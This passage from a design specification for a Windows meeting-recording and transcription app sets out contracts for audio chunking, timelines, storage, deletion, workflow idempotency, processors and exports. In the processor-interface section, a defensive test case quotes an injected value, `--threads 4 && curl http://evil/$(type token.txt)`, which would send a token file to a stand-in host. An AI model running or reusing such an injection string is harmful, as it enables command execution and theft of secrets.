`failed{artifact_root_lost}` after the bounded queue drains, with everything already durable preserved).

**Invariants.** Data file rename precedes its manifest record. A gap is always explicit. Sequence numbers are
dense-or-gapped, never renumbered.

**Failure semantics.** Disk full → same path as backpressure overflow, with `capture.degraded{disk_full}` and
a surfaced warning; recording continues at reduced fidelity of coverage rather than stopping, because a
partially covered meeting beats no meeting — and the gap record makes the loss visible rather than deniable.

**Normal witness.** A 95-second synthetic session yields chunks `000000..000002` of 30 s and a final chunk of
5 s, all with valid WAV headers, and a manifest listing exactly those four.

**Adversarial witness** (risk tags: `recovery`, `scale`, `boundary`, `partial_data`). Given the engine is
killed with `TerminateProcess` 12 seconds into chunk `000003`, when the engine restarts, then chunks
`000000..000002` are intact, the `.part` file is either repaired to a 12 s chunk or removed with a 12 s gap
recorded, and no more than 30 s of audio is unaccounted for. Second case (scale): a 2-hour session produces
240 chunks per track, 480 files in all; recovery must complete within **10 seconds** on the reference
machine class and must not be O(n²) in directory scans. Ten seconds is chosen because it is the point at
which a user who restarted the application would conclude it had hung; `v-chunk-2h-scale` asserts it as a
hard limit, and a recovery that is quadratic in the chunk count crosses it well before 480 files.

**Verification.** `v-chunk-kill-recovery` (T2): kill at a controlled offset, assert bound and repair.
`v-chunk-manifest-vs-directory` (T1): directory-truth reconciliation, both directions.
`v-chunk-backpressure-gap` (T1): a stalling filesystem fake yields a gap record, not a stall.
`v-chunk-2h-scale` (T2): 240-chunk recovery within bound.

<!-- anchor: contract-session-timeline -->
### contract-session-timeline — sample-accurate positions, explicit gaps, honest track alignment

Owner: `component-core-types` (produced by `component-capture-engine`). Dimension: `data_model`.
Requirements: FR-015, FR-017, FR-013. Evidence mode: `total`. Observable scope: `global`.

**Rule.** Each track carries an origin `{start_wall_utc, start_monotonic_ns, sample_rate, channels,
capture_mode, contamination_risk}` and every chunk carries `start_sample` on that track. Any timestamp shown
to a user or attached to a transcript segment is computed as `start_sample / sample_rate` plus the track
origin — **never** from concatenation order. Gaps are first-class records `{from_sample, to_sample, reason}`;
consolidation may render a gap as silence but must also keep the gap record, so a consumer can distinguish
"silence in the room" from "audio we do not have".

**Cross-track alignment.** The microphone track and the loopback track are separate WASAPI streams that start
at different instants and drift; they are aligned by wall-clock origin, and the session records
`alignment_uncertainty_ms`. Nothing may assume that sample *n* of one track is contemporaneous with sample *n*
of the other. A device sample-rate or endpoint change mid-session (Bluetooth reconnect — an explicit Phase 5
matrix case) opens a **new track segment** with its own origin rather than continuing the old one.

**Phase-1 robustness.** `capture_mode` ∈ {`process_loopback`, `system_loopback`, `device`} and
`contamination_risk` ∈ {`none`, `possible_other_apps`} exist now so that ESD-1's outcome (whether per-process
loopback is available for a given application) changes *data*, not schema, and so that PLAN §4's accepted
browser limitation is recorded per track rather than assumed globally.

**Operational inputs.** Device clock/sample position (`information`, `stream`, producer external — the audio
device via WASAPI — acquired continuously during capture, required until finalization, `snapshot` per chunk;
a device position discontinuity is recorded as a gap plus, if the format changed, a new track segment).

**Invariants.** Every sample of every track has exactly one position in session coordinates. The union of
chunks and gaps covers each track's range with no overlap.

**Failure semantics.** A chunk whose `start_sample` overlaps a previous chunk is a hard error (`failed`), not a
silent overwrite — overlap means the writer lost track of position and every downstream timestamp is suspect.

**Normal witness.** A 95-second synthetic session's fourth chunk reports `start_sample = 1_440_000` and a
transcript segment at chunk-local 2.5 s maps to session time 92.5 s.

**Adversarial witness** (risk tags: `partial_data`, `boundary`, `stale`, `recovery`). Given a session whose
chunk `000002` was lost (12 s gap), when transcript timestamps are computed, then every segment after the gap
must retain its true session time; an implementation that concatenates surviving chunks and counts from zero
shifts everything by 30 s and links every decision to the wrong moment — this is the single most damaging
plausible mis-implementation in the recording model. Second case: a Bluetooth headset reconnects and the
device switches from 16 kHz to 48 kHz native; the timeline must open a new segment, and the old segment's
positions must not be reinterpreted at the new rate.

**Verification.** `v-timeline-gap-preserving-timestamps` (T1). `v-timeline-coverage-invariant` (T1): property
test that chunks ∪ gaps tile the range without overlap. `v-timeline-track-independence` (T1): two tracks with
different origins map correctly. `v-timeline-format-change-segment` (T1).

**Semantic profile.** `scope_consistency` — a global observable (the session timeline) is assembled from
partial, streaming inputs (two independent chunk streams), so every partial view must map into the same
global coordinates.

<!-- anchor: contract-track-consolidation -->
### contract-track-consolidation — verify before you delete

Owner: `component-capture-engine`. Dimension: `data_model`. Requirements: FR-016, FR-013. Evidence mode:
`total`. Observable scope: `local`.

**Rule.** After finalization, each track's chunks are encoded to `<meeting>/tracks/<track>.flac`. The encoder
output is then decoded and compared **sample-exactly** against the chunk sequence with recorded gaps rendered
as silence. Only on equality is the FLAC file renamed into place, recorded in the manifest, and the source WAV
chunks deleted; the deletion is itself a recorded manifest event. The ordering is: encode → verify → rename →
record → delete. Any other ordering can lose audio.

**Failure semantics.** A crash leaving `<track>.flac.part` discards the part on restart and re-runs
consolidation from chunks — the operation is idempotent because chunks are still present. A crash between
`record` and `delete` leaves both representations; the manifest state decides, and re-running deletes the
chunks. A verification mismatch is a permanent error: the FLAC is discarded, the chunks are kept, and the
session is marked `consolidation_failed` with the WAV chunks remaining the archival form. Losing fidelity is
never preferable to keeping bytes.

**Operational inputs.** None beyond the chunk set. `input_closure_reason`: consolidation is a pure local
transformation over durable files owned by this component; correctness is decidable from the files themselves.

**Invariants.** WAV chunks are never deleted before a successful verification of the file that replaces them.
Sample count in equals sample count out, gaps included.

**Normal witness.** Four chunks totalling 95 s consolidate to one FLAC that decodes to 1 520 000 identical
samples; chunks are then absent and the manifest records the deletion.

**Adversarial witness** (risk tags: `recovery`, `boundary`, `malformed`). Given the process is killed between
the successful verification and the chunk deletion, when it restarts, then re-running consolidation must be a
no-op that completes the deletion, and must not re-encode into a second file or delete the FLAC. Second case:
an encoder configured with the wrong channel count silently produces stereo; the sample-exact verification must
fail and the chunks must survive.

**Verification.** `v-consolidate-lossless` (T1). `v-consolidate-crash-idempotent` (T1).
`v-consolidate-mismatch-keeps-chunks` (T1).

**Discretion.** The FLAC encoder binding is `discretion-flac-encoder-binding`.

<!-- anchor: contract-artifact-addressing -->
### contract-artifact-addressing — relocatable artifacts, pinned database

Owner: `component-store`. Dimension: `data_model`. Requirements: FR-024, NFR-007, FR-017. Evidence mode: `total`.
Observable scope: `global`.

**Rule.** Artifacts are referenced as `(root_id, relative_path)`; a `roots` table maps `root_id` to an absolute
path. **No absolute artifact path is ever stored in the database or in an exported document.** Relocating the
artifact root updates exactly one row. Layout under a root:
`meetings/<meeting_id>/chunks/<track>/<seq>.wav`, `meetings/<meeting_id>/tracks/<track>.flac`,
`meetings/<meeting_id>/transcript/`, `meetings/<meeting_id>/summary/`, `meetings/<meeting_id>/exports/`.
The database itself is pinned to `%LOCALAPPDATA%\MeetingAssistant\db\` and is **not** relocatable, because
SQLite WAL requires a shared-memory file whose behaviour on network shares and removable media is unreliable —
so the user-configurable root buys artifact placement flexibility without buying database corruption.

**Path safety.** Every path segment is a generated identifier (UUIDv7 hex) or a fixed literal; no user-supplied
text — meeting title, participant name, application name — ever forms a path segment. This removes traversal,
invalid-character and length classes entirely rather than sanitizing them. Long paths use the `\\?\` prefix.

**Operational inputs.** Configured artifact root (`versioned_state`, producer `component-ui-shell` via
settings, acquired at engine start and on change, required until session end, `snapshot` for the duration of a
session — a root change takes effect at the next idle transition, never mid-session; unavailable at start →
read-only degraded mode, capture refused with a typed error, and never a silent write into a recreated empty
directory).

**Invariants.** A relocated root leaves every stored reference valid. No database row contains a drive letter
or UNC prefix for an artifact.

**Failure semantics.** Root missing at startup: degraded read-only mode with an explicit error. Root missing
mid-session: `contract-chunk-durability`'s `failed{artifact_root_lost}` path.

**Normal witness.** After moving the root from `D:\ma` to `E:\ma` and updating the row, every meeting in the
library still resolves and plays.

**Adversarial witness** (risk tags: `boundary`, `stale`, `unsupported_environment`). Given a meeting titled
`Q3 レビュー: 予算/採用 <重要>` (300 characters), when its directory is created, then the path contains only
the UUID — an implementation that slugifies the title produces an invalid or over-long Windows path and fails
on some machines and not others. Second case: the user relocates the root while a session is `recording`; the
change must be deferred and the running session must keep writing to the old root.

**Verification.** `v-addressing-no-absolute-paths` (T0): schema/SQL assertion plus a test scanning inserted
rows. `v-addressing-relocation` (T1). `v-addressing-identifier-only-segments` (T1): property test over hostile
titles. `v-addressing-db-not-relocatable` (T0).

<!-- anchor: contract-store-ownership -->
### contract-store-ownership — one writer per table family

Owner: `component-store`. Dimension: `concurrency`. Requirements: FR-017, FR-018, NFR-007. Evidence mode:
`total`. Observable scope: `global`.

**Rule.** SQLite in WAL mode, `synchronous = NORMAL`, declared `busy_timeout` (5 s), foreign keys on. Writer
ownership is declared per table family and enforced by the connection's role:

| Family | Tables | Writer |
| --- | --- | --- |
| session | `session`, `session_transition`, `track`, `chunk`, `gap` | `ma-engine.exe` |
| workflow | `workflow_step`, `work_item`, `effect_ledger`, `artifact`, `generation`, `edit_overlay` | `ma-engine.exe` |
| export | `export`, `export_attempt`, `egress_audit` | `ma-engine.exe` |
| tombstone | `tombstone` | `ma-engine.exe` (the purge job, see `contract-retention-purge`) |
| settings | `settings`, `app_mode_override`, `roots` | UI host |

There are exactly **two** writer processes and this table is the closed assignment — not a family per
process, but a fixed mapping that a role check enforces. It follows from
`adr-20260903-workflow-runtime-process-topology`: the workflow runtime lives in the engine, so the
`workflow` and `export` families move there with it, and the UI keeps only `settings`. Any table the UI
would otherwise write is written through an IPC method instead (`artifact.edit`, `meeting.delete`), which is
why the method set in `contract-ipc-protocol` is small rather than a general remote-write surface. Reads are
unrestricted for both processes; only writes carry a role.

Routing *every* write through the engine — the alternative the drafts kept open — was rejected because it
turns each settings change into an RPC and makes the engine a availability dependency for a preferences
screen, while removing contention that WAL already handles for a settings table written at human speed. The
rejection is recorded in `adr-20260903-local-store-and-artifact-layout` together with the cost accepted in
exchange: cross-process WAL contention exists, is bounded by `busy_timeout`, and is verified not to reach
capture by `v-store-busy-does-not-stall-capture`.

**Schema version and migration.** SQLite `user_version` is the schema-version carrier, and migrations are
ordered and **forward-only**: there is no down-migration, and a database whose `user_version` is newer than
the binary understands is a refusal to open with a typed error naming the version the file needs — never a
best-effort read of columns that happen to be recognised. `v-store-migration-forward-from-every-version`
applies every migration from every released version and from empty; today that released set is empty, and the
test is written so that adding a release adds a case rather than a test. The rule lives here rather than in a
separate compatibility contract because the refusal, the migration order and the writer roles are enforced by
the same connection-open path, and a compatibility rule divorced from that path has no failing case in this
contract's own tests.

A connection is opened with a role, and writes outside the role's families are rejected — in debug builds by
an assertion and in all builds by a test that enumerates every statement's target table per role. Every state
change is one transaction; any read-modify-write uses `BEGIN IMMEDIATE`. The database is a **projection**: the
authoritative record of captured audio is the chunk directory (`contract-chunk-durability`), so a database
loss degrades the library, never the recording.

**Operational inputs.** Database file lock availability (`versioned_state`, producer external — SQLite/OS —
acquired per transaction, required for that transaction, `current_lookup`; on `SQLITE_BUSY` past the timeout,
a bounded retry with backoff then a typed `StoreBusy` error surfaced to the caller — never an unbounded spin
and never a silent drop of the state change).

**Invariants.** No table has two writer roles. No state change spans two transactions. No reader ever
silently interprets a `user_version` it does not know.

**Failure semantics.** `StoreBusy` on a session transition is retried; if it persists, the engine still holds
the transition in memory and continues capture, and reconciles at the next successful write — capture never
waits on the database.

**Normal witness.** Engine writes chunk rows at 30 s cadence while the UI runs a library query; neither blocks
the other beyond the declared timeout.

**Adversarial witness** (risk tags: `concurrency`, `stale`, `unsupported_environment`). Given the workflow
host is mid-checkpoint and holds the write lock, when the engine writes a `session_transition` at the same
instant, then the engine must not lose the transition and must not stall capture: the test wedges a writer for
longer than `busy_timeout` and asserts chunk cadence is unchanged and the transition eventually lands. Second
case: a role-violating write (the UI host writing `workflow_step`, or the engine writing `settings`) must be
caught by `v-store-role-enforcement`.

**Verification.** `v-store-role-enforcement` (T1). `v-store-busy-does-not-stall-capture` (T2).
`v-store-migration-forward-from-every-version` (T1). `v-store-wal-config` (T0).

**Note on the adversarial witness.** It is written above as "the workflow host holds the write lock"; with
the workflow runtime inside the engine that contention is now engine-internal for the `workflow` family and
cross-process only against the UI's `settings` writes. The test is unchanged in substance and gains a
second case: a UI wedged mid-`settings` transaction must not delay a `session_transition` write past the
point where capture would notice, and the engine must hold the transition in memory rather than block.

<!-- anchor: contract-retention-purge -->
### contract-retention-purge — deletion that finishes, and a tombstone that proves it did

Owner: `component-store`. Dimension: `data_model`. Requirements: FR-029, FR-024, NFR-002. Evidence mode:
`fallible`. Observable scope: `global`.

**Why this contract exists.** This plan makes the chunk directory the truth and the database a projection, and
records a remote identity per export. Deletion therefore crosses that split and reaches five places that can
each independently survive a naive "delete the folder": chunk files, the consolidated FLAC, derived artifacts
(transcript, summary, export staging), database rows, and the `egress_audit` rows that name remote objects.
PLAN §8 defers the retention *policy* to Phase 2; it does not defer what "deleted" means, and PLAN §3 assigns
retention and deletion to the application. Without an owner, deletion is whichever subset the first
implementation happened to cover.

**Rule — two phases.** Phase 1, `meeting.delete`: set `deleted_at` in one transaction, which makes the meeting
invisible to every UI view and to workflow enqueue, and request cancellation of every in-flight step and
export for it. Cancellation is a request, not an assumption — a step already running in a host child is
killed, and a step mid-`intended` in the effect ledger is resolved before its meeting is purged, so a purge
never races an effect that is about to create something. Phase 2, the **purge job**: recursively remove
`meetings/<meeting_id>/` under the artifact root, delete every derived row, and insert
`tombstone(meeting_id, created_at, deleted_at, remote_resource_refs[])`.

**What survives.** Exactly the tombstone, and nothing in it identifies content: the meeting id, two
timestamps, and the list of remote resource identifiers this application created. Its job is to answer "was
this deleted?" and "what did we put in the user's Drive and Notion?" — the second matters because **remote
objects are never deleted**. They are the user's own files in the user's own account; deleting them on the
user's behalf is a destructive act the application is not authorized to take. The UI lists them from the
tombstone so the user can remove them if they want to.

**Idempotence and resumption.** Purge is idempotent and convergent: it may be run any number of times,
including after a kill mid-directory-walk, and each run advances toward "nothing left" without error. It is
driven from the `deleted_at` rows, so a restart resumes it without a queue entry surviving.

**Grace period.** The mechanism supports a configurable delay between phase 1 and phase 2, and Phase 0
assigns it **no default** — per PLAN §8 the value is Phase 2's decision. The configuration point exists now so
that adding the value later is a settings change rather than a redesign.

**Operational inputs.** Artifact root availability (`versioned_state`, producer external — the filesystem —
acquired at purge start, required until the purge completes, `current_lookup`; unavailable, for example an
unplugged external root, → the purge stays pending and the meeting stays `deleted_at`-hidden but **not**
tombstoned, because claiming deletion of bytes that still exist somewhere is the failure this contract
exists to prevent).

**Invariants.** After a tombstone exists for a meeting, no path under the artifact root contains that
`meeting_id` and no row outside `tombstone` references it. Before a tombstone exists, the meeting is invisible
but its bytes may still be present. There is no state in which the user is told a meeting is gone while any
byte of it remains.

**Failure semantics.** A file that cannot be removed (open handle, permission) yields `PurgeIncomplete`, the
purge is re-queued, and the UI keeps saying "deleting" rather than "deleted". An `egress_audit` row is
reduced to its identifiers and outcome rather than deleted outright when it is still needed to render the
tombstone's remote list.

**Outcome partition.** `determinate` — purge completed, tombstone written. `unknown` — purge interrupted;
resumable, meeting stays hidden, no tombstone. `inconclusive` — the artifact root is unreachable, so whether
bytes remain cannot be decided; treated as `unknown` for the user-visible state and retried. Coverage basis:
the three outcomes partition on (tombstone written?) × (root reachable?), and no fourth combination is
reachable because a tombstone is written only after a completed walk of a reachable root. Default policy: any
outcome other than `determinate` leaves the meeting hidden and un-tombstoned and schedules a retry.

**Normal witness.** A meeting with 240 chunks, a consolidated FLAC, a transcript, a summary and one Drive
export is deleted: it disappears from the library immediately, and after the purge the artifact root contains
no path with that `meeting_id`, the database holds exactly one `tombstone` row for it carrying the Drive file
id, and the Drive file still exists.

**Adversarial witness** (risk tags: `recovery`, `repeated_usage`, `partial_data`). Given a purge that is
killed halfway through removing the chunk directory, when the engine restarts, then the purge resumes and
completes, a second manual run is a no-op rather than an error, and no partially deleted meeting is ever
presented as available. Second case: given an export step in the effect ledger at `intended` for a meeting
that is then deleted, when the purge runs, then it does not proceed until that ledger row is resolved — an
implementation that purges first can be observed creating a Drive file for a meeting that no longer exists.

**Verification.** `v-purge-completeness` (T1): after purge, a scan of the temp artifact root and every table
finds the `meeting_id` only in `tombstone`. `v-purge-idempotent` (T1): a second purge run changes nothing and
returns success. `v-purge-cancels-inflight-steps` (T1): deletion cancels running steps and blocks on
`intended` ledger rows. `v-purge-interrupted-resumes` (T2): kill mid-walk, restart, converge.

<!-- anchor: contract-stable-identity -->
### contract-stable-identity — identifiers that survive restarts and cross boundaries unchanged

Owner: `component-core-types`. Dimension: `data_model`. Requirements: FR-017, FR-018, FR-023. Evidence mode:
`total`. Observable scope: `global`.

**Rule.** UUIDv7 (time-ordered, sortable, collision-free without coordination) for `meeting_id`, `session_id`,
`track_id`, `chunk_id`, `artifact_id`, `step_id`, `export_id`, `signal_id`, `decision_id`; chunks additionally
carry a per-track dense `seq`. Each id is assigned by the component that owns the entity, persisted before any
side effect that references it, and reproduced **verbatim** in database rows, filesystem path segments and
export payloads — the same string in all three, so an operator can grep one and find the others. Ids are opaque
to consumers (nothing may parse meaning out of them) but time-ordered for indexing. A `session_id` never
changes across recovery; an interrupted meeting that continues produces a new session carrying
`continues_from: <session_id>`.

**Operational inputs.** None. `input_closure_reason`: identifier generation is local and self-contained; no
external authority, ordering service or registry participates.

**Invariants.** Recovery reuses the id found on disk and never mints a replacement. The same entity has one id
everywhere.

**Failure semantics.** An id collision (practically impossible, but detectable via a unique constraint) is a
hard error, never a silent overwrite of an existing row.

**Normal witness.** A recovered session's directory name, `session.id` row and IPC snapshot all show the same
UUID.

**Adversarial witness** (risk tags: `recovery`, `repeated_usage`, `boundary`). Given the engine crashes and
restarts while a session directory exists, when recovery runs, then the recovered session must carry the id
read from the directory — an implementation that generates a fresh id creates an orphan directory whose audio
is unreachable from the library, and the loss is invisible until a user goes looking. Second case: an export
payload identifying the meeting by title rather than by `meeting_id` breaks
`contract-destination-export-idempotency` after a rename; a test asserts export payloads contain the id.

**Verification.** `v-identity-recovery-reuse` (T2). `v-identity-cross-surface-equality` (T1): one entity,
three surfaces, one string. `v-identity-ordering` (T1): property test on UUIDv7 monotonicity.

<!-- anchor: contract-workflow-step-idempotency -->
### contract-workflow-step-idempotency — completed work is never redone, changed work is never confused

Owner: `component-workflow-core`. Dimension: `state_lifecycle`. Requirements: FR-018, FR-019, FR-021.
Evidence mode: `total`. Observable scope: `global`.

**Rule.** `step_key = hash(session_id, step_kind, ordered input artifact ids, processor_id, processor_version,
config_hash)`. Enqueueing a key that is already `succeeded` is a no-op returning the recorded result.
Changing a processor, its version or its configuration produces a **different** key and therefore a new step;
the previous result is retained, which is what makes regeneration non-destructive. Step states:
`pending → running → succeeded | failed_retryable | failed_permanent | cancelled`. A step found `running` at
startup past its lease deadline is returned to `pending` (its owner crashed).

**Intent before effect.** "Idempotent or committed in the same transaction" is a statement of intent that an
implementation can satisfy by committing *after* a remote create, which is exactly the window that produces
duplicates. The contract therefore fixes the procedure instead of the property:

1. Commit `effect_ledger(step_id, idempotency_key, state = intended, resource_ref = null)` **before** any
   effect outside the state database — before writing a file under the artifact root, before spawning a
   processor host, before an outbound request.
2. Apply the effect.
3. Update the same row to `state = applied, resource_ref = <identity of what was created>` and move the step
   to `succeeded`, releasing the lease.

On restart, a row in `intended` with no `applied` is the named outcome `unknown` — not "assume it did not
happen". Recovery resolves it by the owning contract's lookup path (`contract-destination-export-idempotency`
for remote objects, the artifact directory for local files) and, where neither can decide, surfaces an
explicit user decision. A silent recreate is a contract violation, not a design choice.

Transcription decomposes into per-chunk **work items** with stable ids so a single failed chunk retries
independently (PLAN Phase 3 exit criterion).

**User edits.** Generated content is immutable: each processor run appends a
`generation(id, artifact_id, produced_at, processor_id, model_id, adapter_version)` row and never edits a
previous one. User edits live in a separate layer,
`edit_overlay(id, meeting_id, target_kind, anchor, value, edited_at, orphaned)`, and what a user sees is
"latest generation + overlay", composed at read time. Regeneration therefore *cannot* destroy an edit: it
adds a generation and does not touch the overlay. Re-anchoring runs after the new generation lands; an
overlay that cannot be re-anchored is kept with `orphaned = true` and listed in the UI as "edits that could
not be re-applied", never deleted. Speaker-label edits anchor to the **speaker cluster**, not to a
transcript segment, because a re-run with a different model re-segments the transcript but usually preserves
the cluster — anchoring those to segments would orphan every speaker rename on every regeneration.

The re-anchoring *rule* for text edits (time-range overlap plus text hash, turn index, or carried-through
segment ids) is a Phase 3 concern and is deliberately not fixed here; what is fixed here is the invariant
that decides whether Phase 3 got it right — an edit is always either re-applied or observable as orphaned,
and never silently gone.

**Operational inputs.** (1) Processor version and configuration digest (`information`, `single_value`,
producer `component-processor-contract`, acquired at enqueue time, required until the step terminates,
`snapshot` — the key is computed once at enqueue so a mid-run configuration change cannot retarget a running
step; a changed configuration produces a new step at the next enqueue). (2) Overlay anchor basis
(`information`, `indexed`, producer `component-processor-contract` — the segment boundaries, speaker clusters
and text hashes of the generation the user was looking at — acquired at edit time, required for every later
regeneration, `snapshot`, mutable between acquire and use because a later generation may not match;
invalidation → the overlay becomes `orphaned`; **unavailable → the edit is refused rather than stored**, because
an overlay with no anchor can never be re-applied and would become a silent loss the moment anything is
regenerated).

**Invariants.** For a given key, at most one `succeeded` result exists. No completed step's side effects run
twice.

**Failure semantics.** `failed_retryable` re-enters the queue with exponential backoff (1 s, 4 s, 16 s,
64 s, 256 s) and a cap of **5 attempts**, after which it becomes `failed_permanent` with the last typed error
preserved. Failure of any processing step never touches the recording path (PLAN §7) — structurally, because
`ma-workflow` is not reachable from the capture path and because the processor that failed was a separate
process; both are `contract-processing-isolation`'s to verify, not this contract's to assert.

**Normal witness.** Enqueue transcription twice for the same session and configuration: one execution, two
successful returns of the same result id.

**Adversarial witness** (risk tags: `recovery`, `repeated_usage`, `concurrency`, `stale`). Given a step whose
processor succeeded but whose completion was not recorded because the host was killed in between, when the
host restarts, then the lease expiry returns the step to `pending` and the re-run must not produce a duplicate
artifact — the test asserts exactly one artifact row and one file. Second case: a user renames a speaker,
then regenerates the summary with a different model; the rename must survive, and if its anchor is gone it
must appear as an orphaned edit rather than vanishing.

**Verification.** `v-workflow-duplicate-enqueue-noop` (T1). `v-workflow-lease-recovery-no-duplicate` (T1).
`v-workflow-config-change-new-step` (T1). `v-workflow-edit-preservation` (T1).

<!-- anchor: contract-processor-interface -->
### contract-processor-interface — replaceable processing with no shell and no smuggled inputs

Owner: `component-processor-contract`. Dimension: `integration_contract`. Requirements: FR-020, FR-021,
FR-030, NFR-001, NFR-006. Evidence mode: `fallible`. Observable scope: `local`.

**Rule.** A `Processor` declares `{kind: transcription | diarization | summarization, languages, needs_gpu,
max_input_seconds, streaming, egress_hosts}`. A request outside the declared capability is refused as
`Unsupported` before any work — a request to transcribe an unsupported language is a typed refusal, not a
best-effort attempt. Inputs are passed as **staged paths** in a per-job directory containing only the declared
inputs, created with a user-only ACL and removed when the job ends. External programs are launched with an
argument **vector** built from a fixed template declared in the signed processor manifest; user configuration
supplies only enumerated, typed parameter values that are substituted as whole arguments. There is no shell,
ever, and there is no configuration field that becomes a command line. Secrets never appear in `argv`
(readable by other processes on Windows); they are passed through the child's environment or stdin. Outputs
carry provenance `{processor_id, version, model_id, model_digest, config_hash}`. Failure taxonomy:
`Unsupported`, `InvalidInput`, `Retryable{after}`, `Permanent`, `Cancelled`, `BudgetExceeded`, `HostCrashed`.

**Where a processor runs.** Every processor whose implementation loads a native inference library or executes
an external program runs inside `ma-processor-host.exe`, one child process per job, spawned by the engine's
supervisor (FR-030, `contract-processing-isolation`). What crosses that boundary is fixed here: the host
receives the staged directory path, the processor id and the templated argv on stdin as **one** verified
request frame, and writes **zero or more progress frames followed by exactly one result frame** on stdout, in
that order. How those frames are encoded on the wire is not fixed here and is delegated to
`discretion-processor-host-framing`, which is admissible only because the supervisor and
`ma-processor-host.exe` ship in one installer and are replaced together, so no differently versioned peer ever
reads them — a framing read by an independently updated peer would be a versioned surface and not a
discretion. Cancellation is `TerminateProcess` on the host after a 5-second
graceful window, which is why cancellation is bounded by construction rather than by processor cooperation.
The host is bounded by a job object with a declared memory cap of **4 GiB** and is killed when it is exceeded;
that kill is classified by `contract-processing-isolation`'s exit table, which is the single place a child
outcome is turned into a step state. A
pure-Rust, allocation-bounded processor (for example a formatting or redaction step) may run in-process; the
manifest declares which, and the boundary check enforces that no in-process processor crate links a native
inference library.

**Operational inputs.** (1) API key for an external processor (`authority`, producer external — the user's
provider account — acquired from the credential store at job start, required until the request completes,
`capability_bound`, mutable between acquire and use (revocation), invalidation → `NeedsAuthentication` surfaced
and the step becomes `failed_permanent` pending re-auth, never a silent skip). (2) Local model file
(`versioned_state`, `full`, producer external — the model distribution — acquired at first use, required for
every local job, `version_bound` with a digest pinned by the signed adapter manifest; a digest mismatch is a
`Permanent` failure, never a silent run on an unverified model).

**Invariants.** A staged directory contains exactly the declared inputs and nothing else. No processor
invocation passes through a shell. Every external processor's egress host appears in the egress inventory.

**Failure semantics.** A crashing external processor — an abnormal exit, an `abort()`, an access violation or
a job-object memory-cap kill — terminates only its own host child; the engine observes the outcome and records
`HostCrashed`, which is `Retryable` for the first two attempts of that work item and `Permanent` thereafter.
That classification is stated once, in `contract-processing-isolation`'s exit table, and is restated here only
as a reader's convenience. It never takes down the engine and never touches capture — that
is the guarantee `contract-processing-isolation` owns and verifies.

**Normal witness.** Local transcription of a 30 s chunk stages exactly one WAV, runs whisper.cpp with a
templated argv, and returns segments with provenance naming the model digest.

**Adversarial witness** (risk tags: `malformed`, `boundary`, `unsupported_environment`, `stale`). Given a
configuration value `--threads 4 && curl http://evil/$(type token.txt)`, when the processor is invoked, then
the entire value is either rejected by the parameter type or passed as a single literal argument, and no shell
interprets it — a test asserts the child process's command line and that no network egress occurs. Second
case: a model file replaced on disk between download and use must fail the digest check; and a staged
directory that (through a path-joining bug) contains the whole meeting folder must fail the
staging-listing assertion, because it would hand a CLI processor the entire meeting archive.

**Verification.** `v-processor-argv-no-shell` (T1). `v-processor-staging-exact-contents` (T1).
`v-processor-capability-refusal` (T1). `v-processor-model-digest` (T1). The host-crash path is verified by
`contract-processing-isolation`'s `v-isolation-processor-abort-keeps-recording` (T2), which is where it
belongs because the observable it protects is the recording, not the processor.

<!-- anchor: contract-processor-budget -->
### contract-processor-budget — a budget that is visible, cancellable and non-fatal

Owner: `component-processor-contract`. Dimension: `performance_budget`. Requirements: FR-021, FR-022, NFR-004.
Evidence mode: `total`. Observable scope: `local`.

**Rule.** Local CPU transcription targets ≤1.0x real time (a two-hour recording finishes within two hours).
Progress is reported at least once per work item and is monotonically non-decreasing; the ETA is derived from
observed throughput over a trailing window, never from a constant factor. Cancellation is observed within one
work item and a declared wall bound (≤5 s), which forces a processor to decompose native work into items
rather than issuing a single blocking multi-hour call. Exceeding the budget emits `budget_exceeded` as a
**warning event** on the step and in the UI; the step continues and may still succeed — per the user decision,
overrun is a warning, not a failure.

**Cost convergence.** Per-work-item cost must be bounded and independent of how many items preceded it: no
accumulating context that makes item *N* cost O(N). The contract test runs a synthetic 240-item job and
asserts per-item duration does not grow superlinearly, because the natural summarization implementation — feed
the whole prior transcript as context — silently turns a linear job into a quadratic one and only shows up on
a two-hour meeting.

**Stall timeout.** A work item's budget is its own media duration at the 1.0x target — **30 seconds** for the
chunk-sized work items this contract's decomposition rule already forces. The stall timeout is five times
that: **150 seconds** with no progress frame. It is a fixed number rather than a per-processor setting for
the same reason every other bound here is: a timeout written as "declared" cannot be falsified. On expiry the
supervisor kills the host child and the step is `Retryable{no_progress}`. That is deliberately a different
outcome from `HostCrashed` (`contract-processing-isolation`): a stall is *observed* — the engine knows the
child was alive and silent — whereas `HostCrashed` is *inferred* from an exit status, and the two want
different retry and diagnostic treatment.

**Operational inputs.** Observed throughput samples (`information`, `stream`, producer
`component-processor-contract` itself, acquired per work item, required until the step terminates,
`current_lookup`; if a processor reports no progress at all, the step is not silently declared healthy — the
150 s stall timeout above raises `Retryable{no_progress}`).

**Invariants.** Progress never decreases. Cancellation always terminates within the declared bound. Budget
overrun never converts a successful transcription into a failure. Every bound in this contract is a fixed
number (30 s per-item budget, 150 s stall timeout, 5 s cancellation bound).

**Failure semantics.** No progress for 150 s → the host child is killed and the step is
`Retryable{no_progress}` with the completed work items preserved so the retry resumes rather than restarts.

**Normal witness.** A 2-hour synthetic job reports monotonic progress, completes under budget, and emits no
warning.

**Adversarial witness** (risk tags: `scale`, `repeated_usage`, `boundary`). Given a processor whose per-item
cost grows with accumulated context, when a 240-item job runs, then `v-budget-cost-convergence` must fail —
this is the case a small test file never reveals. Second case: a processor that ignores cancellation because
its FFI call blocks for the whole job must fail `v-budget-cancellation-bound`, which asserts the cancel-to-stop
interval, not merely that a cancel flag was set.

**Verification.** `v-budget-progress-monotonic` (T1). `v-budget-cancellation-bound` (T1).
`v-budget-cost-convergence` (T1). `v-budget-overrun-is-warning` (T1).

**Semantic profile.** `cost_convergence` — triggered by a declared performance budget over a long-running,
item-decomposed job.

<!-- anchor: contract-destination-export-idempotency -->
### contract-destination-export-idempotency — exactly one remote object per export

Owner: `component-destination-contract`. Dimension: `integration_contract`. Requirements: FR-023, NFR-001,
NFR-006. Evidence mode: `fallible`. Observable scope: `global`.

**Rule.** `export_key = hash(session_id, artifact_id, artifact_version, destination_id,
destination_config_hash)`. Before creating a remote object the destination looks up the recorded
`remote_identity` for the key; if present it reconciles (verify, update) instead of creating. Because Drive
uses the `drive.file` scope, the app cannot discover objects it did not create, so the recorded identity is
the only link — therefore the crash window between "remote object created" and "identity recorded" must be
closed by the protocol, not by hope: resumable upload session URIs are persisted **before** the upload
completes, and each created object carries an app property / `external_id` containing the `export_key` so a
post-crash lookup can find it. Notion sets an `external_id` property at page creation and queries it before
creating.

